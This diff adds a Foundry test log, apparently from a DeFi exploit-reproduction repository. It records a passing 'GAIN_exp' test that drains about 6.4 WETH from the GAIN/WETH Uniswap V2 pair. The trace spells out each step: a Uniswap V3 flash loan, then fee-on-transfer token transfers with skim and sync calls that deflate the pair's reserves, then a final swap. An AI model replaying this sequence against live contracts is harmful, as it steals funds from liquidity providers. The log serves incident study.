@@ -1,0 +1,191 @@
+No files changed, compilation skipped
+
+Ran 1 test for src/test/2024-02/GAIN_exp.sol:ContractTest
+[PASS] testExploit() (gas: 554111)
+Logs:
+  Before Start: 0 ETH
+  Attack Exploit: 6.432936950955627431 ETH
+
+Traces:
+  [652211] ContractTest::testExploit()
+    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Before Start: %d ETH", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [630266] Uniswap V3: USDT::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000 [1e17], 0, 0x)
+    │   ├─ [2534] WETH::balanceOf(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b]) [staticcall]
+    │   │   └─ ← [Return] 775273133927997686533 [7.752e20]
+    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b]) [staticcall]
+    │   │   └─ ← [Return] 3033512964845 [3.033e12]
+    │   ├─ [25962] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000 [1e17])
+    │   │   ├─ emit Transfer(from: Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000000000000000 [1e17])
+    │   │   └─ ← [Return] true
+    │   ├─ [570485] ContractTest::uniswapV3FlashCallback(10000000000000 [1e13], 0, 0x)
+    │   │   ├─ [8062] WETH::transfer(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 100000000000000000 [1e17])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], value: 100000000000000000 [1e17])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [134087] Uniswap V2: GAIN::swap(0, 100000 [1e5], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [90862] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000 [1e5])
+    │   │   │   │   ├─ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 100000 [1e5])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6598936314221857031 [6.598e18]
+    │   │   │   ├─ [6868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 180049177796806821424078518 [1.8e26]
+    │   │   │   ├─ emit Sync(reserve0: 6598936314221857031 [6.598e18], reserve1: 180049177796806821424078518 [1.8e26])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 100000000000000000 [1e17], amount1In: 0, amount0Out: 0, amount1Out: 100000 [1e5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [55185] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 100)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, value: 15)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], value: 84)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24153] Uniswap V2: GAIN::skim(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6598936314221857031 [6.598e18]
+    │   │   │   ├─ [3262] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   ├─ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 180049177796879123627905105 [1.8e26]
+    │   │   │   ├─ [10630] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 72302203826587 [7.23e13])
+    │   │   │   │   ├─ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 72302203826587 [7.23e13])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [9920] Uniswap V2: GAIN::sync()
+    │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6598936314221857031 [6.598e18]
+    │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 117815741151863270524560753 [1.178e26]
+    │   │   │   ├─ emit Sync(reserve0: 6598936314221857031 [6.598e18], reserve1: 117815741151863270524560753 [1.178e26])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [133283] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 188)
+    │   │   │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
+    │   │   │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   ├─ [78675] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForETHSupportingFeeOnTransferTokens(10, 0, [0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, 1708537751 [1.708e9])
+    │   │   │   │   ├─ [10633] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transferFrom(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 10)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [504] Uniswap V2: GAIN::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 6598936314221857031 [6.598e18], 117815741151863270524560753 [1.178e26], 1708537751 [1.708e9]
+    │   │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 117815741151871877929778204 [1.178e26]
+    │   │   │   │   ├─ [40671] Uniswap V2: GAIN::swap(480660 [4.806e5], 0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x)
+    │   │   │   │   │   ├─ [25162] WETH::transfer(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 480660 [4.806e5])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 480660 [4.806e5])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6598936314221376371 [6.598e18]
+    │   │   │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 117815741151871877929778204 [1.178e26]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 6598936314221376371 [6.598e18], reserve1: 117815741151871877929778204 [1.178e26])
+    │   │   │   │   │   ├─ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 0, amount1In: 8607405217451 [8.607e12], amount0Out: 480660 [4.806e5], amount1Out: 0, to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [534] WETH::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480660 [4.806e5]
+    │   │   │   │   ├─ [9223] WETH::withdraw(480660 [4.806e5])
+    │   │   │   │   │   ├─ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 480660}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Withdrawal(src: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 480660 [4.806e5])
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [55] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::fallback{value: 480660}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [0] 0x9F3ca923C65738B3F85Dc4de1b5163E178bf2E16::fallback{value: 160220}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [0] 0x7B6F62aF8641EC14Fc763b4F3fD5035D49C7DB91::fallback{value: 320440}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, value: 30)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], value: 157)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24153] Uniswap V2: GAIN::skim(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6598936314221376371 [6.598e18]
+    │   │   │   ├─ [3262] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   │   ├─ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 117815741152007806072972188 [1.178e26]
+    │   │   │   ├─ [10630] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 135928143193984 [1.359e14])
+    │   │   │   │   ├─ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 135928143193984 [1.359e14])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [9920] Uniswap V2: GAIN::sync()
+    │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 6598936314221376371 [6.598e18]
+    │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 816880259377623512855239 [8.168e23]
+    │   │   │   ├─ emit Sync(reserve0: 6598936314221376371 [6.598e18], reserve1: 816880259377623512855239 [8.168e23])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [113783] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transfer(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 130000000000000 [1.3e14])
+    │   │   │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
+    │   │   │   │   └─ ← [Return] WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
+    │   │   │   ├─ [72675] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForETHSupportingFeeOnTransferTokens(18, 0, [0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, 1708537751 [1.708e9])
+    │   │   │   │   ├─ [6633] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::transferFrom(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], 18)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [504] Uniswap V2: GAIN::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 6598936314221376371 [6.598e18], 816880259377623512855239 [8.168e23], 1708537751 [1.708e9]
+    │   │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 816880259393116842246651 [8.168e23]
+    │   │   │   │   ├─ [38671] Uniswap V2: GAIN::swap(124783007 [1.247e8], 0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x)
+    │   │   │   │   │   ├─ [23162] WETH::transfer(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 124783007 [1.247e8])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 124783007 [1.247e8])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6598936314096593364 [6.598e18]
+    │   │   │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 816880259393116842246651 [8.168e23]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 6598936314096593364 [6.598e18], reserve1: 816880259393116842246651 [8.168e23])
+    │   │   │   │   │   ├─ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 0, amount1In: 15493329391412 [1.549e13], amount0Out: 124783007 [1.247e8], amount1Out: 0, to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [534] WETH::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 124783007 [1.247e8]
+    │   │   │   │   ├─ [9223] WETH::withdraw(124783007 [1.247e8])
+    │   │   │   │   │   ├─ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 124783007}()
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ emit Withdrawal(src: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 124783007 [1.247e8])
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [55] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::fallback{value: 124783007}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [0] 0x9F3ca923C65738B3F85Dc4de1b5163E178bf2E16::fallback{value: 41594335}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [0] 0x7B6F62aF8641EC14Fc763b4F3fD5035D49C7DB91::fallback{value: 83188671}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac, value: 20800000000000 [2.08e13])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], value: 109200000000000 [1.092e14])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   └─ ← [Return] 6598936314096593364 [6.598e18]
+    │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   └─ ← [Return] 6598936314096593364 [6.598e18]
+    │   │   ├─ [38671] Uniswap V2: GAIN::swap(6532946950955627431 [6.532e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [23162] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6532946950955627431 [6.532e18])
+    │   │   │   │   ├─ emit Transfer(from: Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 6532946950955627431 [6.532e18])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 65989363140965933 [6.598e16]
+    │   │   │   ├─ [2868] 0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac::balanceOf(Uniswap V2: GAIN: [0x31d80EA33271891986D873B397d849A92EF49255]) [staticcall]
+    │   │   │   │   └─ ← [Return] 94809745233956213877561280 [9.48e25]
+    │   │   │   ├─ emit Sync(reserve0: 65989363140965933 [6.598e16], reserve1: 94809745233956213877561280 [9.48e25])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 93992864974563097035314629 [9.399e25], amount0Out: 6532946950955627431 [6.532e18], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3262] WETH::transfer(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b], 100010000000000000 [1e17])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b], value: 100010000000000000 [1e17])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WETH::balanceOf(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b]) [staticcall]
+    │   │   └─ ← [Return] 775273143927997686533 [7.752e20]
+    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(Uniswap V3: USDT: [0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b]) [staticcall]
+    │   │   └─ ← [Return] 3033512964845 [3.033e12]
+    │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], qty0: 100000000000000000 [1e17], qty1: 0, paid0: 10000000000000 [1e13], paid1: 0)
+    │   └─ ← [Stop]
+    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 6432936950955627431 [6.432e18]
+    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 6432936950955627431 [6.432e18]
+    ├─ [0] console::log("Attack Exploit: %s.%s ETH", 6, 432936950955627431 [4.329e17]) [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 743.41ms (6.47ms CPU time)
+
+Ran 1 test suite in 756.47ms (743.41ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
